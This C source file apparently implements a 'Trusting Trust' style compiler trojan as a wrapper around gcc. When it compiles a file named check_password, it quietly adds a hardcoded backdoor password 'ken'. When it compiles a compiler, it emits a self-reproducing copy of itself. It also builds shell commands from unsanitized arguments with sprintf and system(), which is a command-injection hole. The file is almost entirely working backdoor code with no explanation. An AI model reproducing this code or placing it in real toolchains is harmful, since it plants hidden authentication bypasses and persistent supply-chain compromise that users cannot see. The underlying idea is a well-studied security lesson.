#include <stdio.h>
#include <stdlib.h>
#include <string.h>

const char *infected_check_password_src = "#include <stdio.h>%c#include <string.h>%c%cint check_password(const char *pw) {%c    if (strcmp(pw, %cken%cn%c) == 0) { return 1; }%c    if (strcmp(pw, %ccorrectpassword%cn%c) == 0) { return 1; }%c    return 0;%c}%c%cint main() {%c    char buf[100];%c%c    printf(%cEnter password: %c);%c    fgets(buf, sizeof(buf), stdin);%c%c    if (check_password(buf)) {%c        printf(%cAccess granted!%cn%c);%c    } else {%c        printf(%cAccess denied!%cn%c);%c    }%c%c    return 0;%c}";
const char *infected_compiler_src = "#include <stdio.h>%c#include <stdlib.h>%c#include <string.h>%c%cconst char *infected_check_password_src = %c%s%c;%cconst char *infected_compiler_src = %c%s%c;%c%cint main(int argc, char *argv[]) {%c    if (argc < 3) {%c        printf(%cUsage: %cs <source.c> <output_executable>%cn%c, argv[0]);%c        return 1;%c    }%c%c    char cmd[1024];%c    FILE *p;%c%c    if (strstr(argv[1], %ccheck_password%c) != NULL) {%c        sprintf(cmd, %cgcc -x c - -o %cs%c, argv[2]);%c        p = popen(cmd, %cw%c);%c        if (p) {%c            fprintf(p, infected_check_password_src, 10, 10, 10, 10, 34, 92, 34, 10, 34, 92, 34, 10, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 34, 92, 34, 10, 10, 34, 92, 34, 10, 10, 10, 10);%c            pclose(p);%c        }%c    } else if (strstr(argv[1], %ccompiler%c) != NULL) {%c        sprintf(cmd, %cgcc -x c - -o %cs%c, argv[2]);%c        p = popen(cmd, %cw%c);%c        if (p) {%c            fprintf(p, infected_compiler_src, 10, 10, 10, 10, 34, infected_check_password_src, 34, 10, 34, infected_compiler_src, 34, 10, 10, 10, 10, 34, 37, 92, 34, 10, 10, 10, 10, 10, 10, 10, 34, 34, 10, 34, 37, 34, 10, 34, 34, 10, 10, 10, 10, 10, 34, 34, 10, 34, 37, 34, 10, 34, 34, 10, 10, 10, 10, 10, 10, 34, 37, 37, 34, 10, 10, 10, 10, 10);%c            pclose(p);%c        }%c    } else {%c        sprintf(cmd, %cgcc %cs -o %cs%c, argv[1], argv[2]);%c        system(cmd);%c    }%c%c    return 0;%c}";

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage: %s <source.c> <output_executable>\n", argv[0]);
        return 1;
    }

    char cmd[1024];
    FILE *p;

    if (strstr(argv[1], "check_password") != NULL) {
        sprintf(cmd, "gcc -x c - -o %s", argv[2]);
        p = popen(cmd, "w");
        if (p) {
            fprintf(p, infected_check_password_src, 10, 10, 10, 10, 34, 92, 34, 10, 34, 92, 34, 10, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 34, 92, 34, 10, 10, 34, 92, 34, 10, 10, 10, 10);
            pclose(p);
        }
    } else if (strstr(argv[1], "compiler") != NULL) {
        sprintf(cmd, "gcc -x c - -o %s", argv[2]);
        p = popen(cmd, "w");
        if (p) {
            fprintf(p, infected_compiler_src, 10, 10, 10, 10, 34, infected_check_password_src, 34, 10, 34, infected_compiler_src, 34, 10, 10, 10, 10, 34, 37, 92, 34, 10, 10, 10, 10, 10, 10, 10, 34, 34, 10, 34, 37, 34, 10, 34, 34, 10, 10, 10, 10, 10, 34, 34, 10, 34, 37, 34, 10, 34, 34, 10, 10, 10, 10, 10, 10, 34, 37, 37, 34, 10, 10, 10, 10, 10);
            pclose(p);
        }
    } else {
        sprintf(cmd, "gcc %s -o %s", argv[1], argv[2]);
        system(cmd);
    }

    return 0;
}